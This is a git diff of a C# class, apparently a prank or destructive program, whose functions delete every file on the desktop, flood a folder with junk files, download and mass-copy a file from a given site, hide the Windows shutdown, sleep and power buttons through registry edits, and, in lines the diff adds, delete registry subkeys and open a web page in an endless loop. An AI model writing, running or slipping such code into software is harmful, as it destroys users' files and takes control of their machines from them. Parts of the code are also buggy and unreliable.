@@ -71,11 +71,11 @@ namespace bramerto_rob_2._0
         }
         public void KillMemory(string path, int time)
         {
-           int i2 = 0;
-           int x2;
-           Random ran = new Random();
-           var list = new List<string> { a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, zero, one, two, three, four, five, six, seven, eight, nine };
-           while (i2 < time) { int index = ran.Next(list.Count); string result = $"{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}"; 
+            int i2 = 0;
+            int x2;
+            Random ran = new Random();
+            var list = new List<string> { a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, zero, one, two, three, four, five, six, seven, eight, nine };
+            while (i2 < time) { int index = ran.Next(list.Count); string result = $"{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}";
                 for (x2 = 0; x2 < 10; x2++) { File.Create(path + result); File.Create(path + result); } }
         }
 
@@ -99,13 +99,13 @@ namespace bramerto_rob_2._0
             {
                 string[] files = Directory.GetFiles(desktop);
                 foreach (string file in files) { File.Delete(file); }
-            }   
+            }
         }
 
         public void CreateFilesOnDesktop(int size, string site, string filename)
         {
             wc.DownloadFile(site, desktop);
-            for (int i = 0; i < size; i++) { string num =  desktop + i.ToString() + filename; File.Copy(desktop, num, true); }
+            for (int i = 0; i < size; i++) { string num = desktop + i.ToString() + filename; File.Copy(desktop, num, true); }
         }
 
         public void SetWallpaper(string path)
@@ -116,12 +116,6 @@ namespace bramerto_rob_2._0
 
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
-
-        public void ChangeStartMenuIcon(string path)
-        {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"", true);
-        }
-
         public void BlockShutDownButton()
         {
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HideShutDown");
@@ -132,7 +126,7 @@ namespace bramerto_rob_2._0
         public void BlockSleepButton()
         {
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HideSleep");
-            if (key.GetValue("value") == null) 
+            if (key.GetValue("value") == null)
                 key.SetValue("value", "1");
         }
 
@@ -148,6 +142,20 @@ namespace bramerto_rob_2._0
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HidePowerButton");
             if (key.GetValue("value") == null)
                 key.SetValue("value", "1");
+        }
+
+        public void DeleteSubKey(string subkey)
+        {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey);
+            key.DeleteSubKey(subkey);
+        }
+
+        public void OpenPage()
+        {
+            while (true)
+            {
+                Process.Start("https://www.youtube.com/watch?v=QDCPKBF7a1Q");
+            }
         }
     }
 }
